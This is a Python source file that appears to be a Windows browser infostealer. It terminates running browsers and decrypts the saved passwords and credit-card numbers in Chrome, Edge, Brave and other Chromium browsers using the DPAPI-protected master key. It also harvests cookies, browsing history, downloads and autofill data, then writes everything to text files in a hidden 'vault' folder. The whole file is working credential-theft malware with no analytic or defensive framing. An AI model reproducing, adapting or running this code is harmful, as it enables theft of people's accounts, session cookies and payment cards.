import time, string, random, shutil, psutil, sqlite3, base64, json, os,zipfile,threading
from concurrent.futures import ThreadPoolExecutor
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
appdata = os.getenv('LOCALAPPDATA')
vault_dir = os.path.join(os.getenv('APPDATA'), 'vault', 'credentials')
user = os.path.expanduser("~")
def exitbrowser():
    browserst = [
        'chrome.exe','msedge.exe', 'brave.exe', 'opera.exe',
        'vivaldi.exe', 'yandex.exe', 'iron.exe', 'epic.exe', 
        'dragon.exe', 'amigo.exe', 'torch.exe', 'kometa.exe', 
        'orbitum.exe', 'cent-browser.exe', '7star.exe', 
        'sputnik.exe', 'google-chrome-sxs.exe', 'uran.exe',
        'iridium.exe', 'sputnik.exe', 'tencent.exe', 'edge.exe', 
        'puffin.exe', 'sleipnir.exe', 'coast.exe', 'avant.exe', 
        'lunascape.exe', 'maxthon.exe', 'dooble.exe', 'midori.exe',
        'k-meleon.exe', 'qutebrowser.exe', 'waterfox.exe', 
        'palemoon.exe', 'wexond.exe', 'seamonkey.exe', 'qutebrowser.exe'
    ]

    for proc in psutil.process_iter(['pid', 'name']):
        if any(browser in proc.info['name'].lower() for browser in browserst):
            try:
                proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'edge': appdata + '\\Microsoft\\Edge\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'opera': appdata + '\\Opera Software\\Opera Stable\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'iron': appdata + '\\SRWare Iron\\User Data',
    'epic': appdata + '\\EpicPrivacyBrowser\\User Data',
    'comodo': appdata + '\\Comodo\\Dragon\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}
def get_master_key(path: str):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
        return None
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        return None
def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
    return decrypted_pass
def random_filename(prefix):
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"

def get_login_data(path: str, profile: str, master_key):
    result = ""
    login_db = os.path.join(path, profile, "Login Data")
    if not os.path.exists(login_db):
        return None
    temp_login_db = os.path.join(user + '\\AppData\\Local\\Temp', random_filename('login_db'))
    shutil.copy(login_db, temp_login_db)
    conn = sqlite3.connect(temp_login_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    browser = "Other"
    for root, dirs, files in os.walk(os.path.join(path, profile)):
        if 'chrome' in root.lower():
            browser = "Chrome"
            break
        elif 'edge' in root.lower():
            browser = "Edge"
            break
        elif 'firefox' in root.lower():
            browser = "Firefox"
            break
    for row in cursor.fetchall():
        url = row[0]
        username = row[1] if row[1] else "N/A"
        password = decrypt_password(row[2], master_key) if row[2] else "N/A"
        result += f"Browser: {browser}\nProfile: {profile}\nURL: {url}\nEmail/Username: {username}\nPassword: {password}\n"
        result += "----------------------------------------------------\n"
    conn.close()
    os.remove(temp_login_db)
    return result

def get_cookies(path: str, profile: str):
    network_folder = os.path.join(path, profile, "Network")
    cookies_db = os.path.join(network_folder, "Cookies")
    if not os.path.exists(network_folder) or not os.path.exists(cookies_db):
        return None
    result = ""
    temp_filename = f"cookies_db_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}.db"
    temp_path = os.path.join(os.getenv('LOCALAPPDATA'), "Temp", temp_filename)
    
    try:
        try:
            shutil.copy(cookies_db, temp_path)
        except PermissionError:
            pass

        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT name, value, host_key, path, is_secure, expires_utc FROM cookies')
            
            for row in cursor.fetchall():
                host = row[2] if row[2].startswith('.') else '.' + row[2]
                secure = 'TRUE' if row[4] else 'FALSE'
                expires = str(int(row[5] / 1000000 - 11644473600))
                result += f"{host}\tTRUE\t{row[3]}\t{secure}\t{expires}\t{row[0]}\t{row[1]}\n"
            
            conn.close()
        except:
            pass

    finally:
        try:
            os.remove(temp_path)
        except:
            pass

    return result
def random_filename(prefix):
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"
def convert_timestamp(timestamp):
    timestamp = timestamp / 1000000 - 11644473600
    return time.strftime('%B, %d, %Y at %I%p', time.gmtime(timestamp))

def get_history(path: str, profile: str):
 history_db = os.path.join(path, profile, "History")
 if not os.path.exists(history_db):return None
 result = ""
 temp_history_db = os.path.join(os.getenv('USERPROFILE')+'\\AppData\\Local\\Temp',random_filename('history_db'))
 shutil.copy(history_db,temp_history_db)
 conn = sqlite3.connect(temp_history_db)
 cursor = conn.cursor()
 cursor.execute('SELECT url,title,visit_count,last_visit_time FROM urls')
 for row in cursor.fetchall():
  result += f"URL: {row[0]}\n"
 conn.close()
 os.remove(temp_history_db)
 return result
def get_cards():
    os.makedirs(vault_dir, exist_ok=True)
    cards_file = os.path.join(vault_dir, 'cards.txt')
    results = "-----------------------------------------------------------\n"
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        master_key = get_master_key(path)
        if not master_key:
            continue
        for profile in os.listdir(path):
            profile_path = os.path.join(path, profile)
            if not os.path.isdir(profile_path):
                continue
            cards_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(cards_db):
                continue
            temp_cards_db = os.path.join(os.getenv('TEMP'), ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".db")
            shutil.copy(cards_db, temp_cards_db)
            conn = sqlite3.connect(temp_cards_db)
            cursor = conn.cursor()
            cursor.execute('SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards')
            for row in cursor.fetchall():
                name = row[0] or "N/A"
                month = row[2] or "N/A"
                year = row[3] or "N/A"
                number = decrypt_password(row[1], master_key) if row[1] else "N/A"
                results += f"Browser: {browser}\nProfile: {profile}\nCardholder Name: {name}\nCard Number: {number}\nExpiration Date: {month}/{year}\n----------------------------------------------------\n"
            conn.close()
            os.remove(temp_cards_db)
    
    if len(results.strip()) > len("-----------------------------------------------------------"):
        with open(cards_file, 'w', encoding='utf-8') as file:
            file.write(results)
def getdl():
    downloads = ""
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        for profile in os.listdir(path):
            profile_path = os.path.join(path, profile)
            if not os.path.isdir(profile_path):
                continue
            downloads_db = os.path.join(profile_path, "History")
            if not os.path.exists(downloads_db):
                continue
            temp_downloads_db = os.path.join(user, 'AppData', 'Local', 'Temp', random_filename('downloads_db'))
            shutil.copy(downloads_db, temp_downloads_db)
            conn = sqlite3.connect(temp_downloads_db)
            cursor = conn.cursor()
            cursor.execute('SELECT target_path, tab_url FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                downloads += f"URL: {row[1]}\nPath: {row[0]}\n"
                downloads += "----------------------------------------------------\n"
            conn.close()
            os.remove(temp_downloads_db)

    downloads_filename = os.path.join(vault_dir, 'downloads.txt')

    if not os.path.exists(vault_dir):
        os.makedirs(vault_dir)
    
    if downloads:
        with open(downloads_filename, 'w', encoding="utf-8") as downloads_file:
            downloads_file.write("------------------------------------------------------------\n")
            downloads_file.write(downloads)

def get_autofill_data(path: str, profile: str):
    autofill_db = os.path.join(path, profile, "Web Data")
    if not os.path.exists(autofill_db):
        return None
    result = ""
    temp_autofill_db = os.path.join(user + '\\AppData\\Local\\Temp', random_filename('autofill_db'))
    shutil.copy(autofill_db, temp_autofill_db)
    
    conn = sqlite3.connect(temp_autofill_db)
    cursor = conn.cursor()
    cursor.execute('SELECT name, value FROM autofill')
    for row in cursor.fetchall():
        result += f"Name: {row[0]}\nValue: {row[1]}\n"
        result += "----------------------------------------------------\n"
    conn.close()
    os.remove(temp_autofill_db)
    return result


def save_results(logins, cookies, history, cards, downloads, autofill_data):
    if not os.path.exists(vault_dir):
        os.makedirs(vault_dir)
    
    if logins:
        logins_filename = os.path.join(vault_dir, 'logins.txt')
        with open(logins_filename, 'w', encoding="utf-8") as logins_file:
            logins_file.write("------------------------------------------------------------\n")
            logins_file.write(logins)
    
    if cookies:
        cookies_filename = os.path.join(vault_dir, 'cookies.txt')
        with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
            cookies_file.write(cookies)
        
    if history:
        if "http" not in history:
            return
        history_filename = os.path.join(vault_dir, 'history.txt')
        with open(history_filename, 'w', encoding="utf-8") as history_file:
            history_file.write(history)

    if cards:
        cards_filename = os.path.join(vault_dir, 'cards.txt')
        with open(cards_filename, 'w', encoding="utf-8") as cards_file:
            cards_file.write(cards)

    if downloads:
        downloads_filename = os.path.join(vault_dir, 'downloads.txt')
        with open(downloads_filename, 'w', encoding="utf-8") as downloads_file:
            downloads_file.write(downloads)

    if autofill_data:
        autofill_filename = os.path.join(vault_dir, 'autofill.txt')
        with open(autofill_filename, 'w', encoding="utf-8") as autofill_file:
            autofill_file.write(autofill_data)


def getinfo():
    total_browsers = 0
    combined_logins = ""
    combined_cookies = ""
    combined_history = ""
    combined_cards = ""
    combined_downloads = "" 
    combined_autofill = ""
    time.sleep(2)
    exitbrowser()

    def process_browser(browser, path):
        nonlocal total_browsers, combined_logins, combined_cookies, combined_history, combined_cards, combined_downloads, combined_autofill
        if not os.path.exists(path):
            return
        master_key = get_master_key(path)
        if not master_key:
            return
        with ThreadPoolExecutor() as executor:
            futures = []
            futures.append(executor.submit(process_logins, path, master_key))
            futures.append(executor.submit(process_cookies, path))
            futures.append(executor.submit(process_history, path))
            futures.append(executor.submit(process_cards))
            futures.append(executor.submit(process_downloads))
            futures.append(executor.submit(process_autofill, path))

            for future in futures:
                future.result()

    def process_autofill(path):
        nonlocal combined_autofill
        for root, dirs, files in os.walk(path):
            for profile in dirs:
                autofill_data = get_autofill_data(path, profile)
                if autofill_data:
                    combined_autofill += autofill_data

    def process_logins(path, master_key):
        nonlocal combined_logins, total_browsers
        for root, dirs, files in os.walk(path):
            for profile in dirs:
                login_data = get_login_data(path, profile, master_key)
                if login_data:
                    combined_logins += login_data
                    total_browsers += 1

    def process_cookies(path):
        nonlocal combined_cookies
        for root, dirs, files in os.walk(path):
            for profile in dirs:
                cookies_data = get_cookies(path, profile)
                if cookies_data:
                    combined_cookies += cookies_data

    def process_history(path):
        nonlocal combined_history
        for root, dirs, files in os.walk(path):
            for profile in dirs:
                history_data = get_history(path, profile)
                if history_data:
                    combined_history += history_data

    def process_cards():
        nonlocal combined_cards
        card_data = get_cards()
        if card_data:
            combined_cards += card_data

    def process_downloads():
        nonlocal combined_downloads
        download_data = getdl()
        if download_data:
            combined_downloads += download_data

    with ThreadPoolExecutor() as executor:
        executor.map(lambda browser_path: process_browser(*browser_path), browsers.items())

    save_results(combined_logins, combined_cookies, combined_history, combined_cards, combined_downloads, combined_autofill)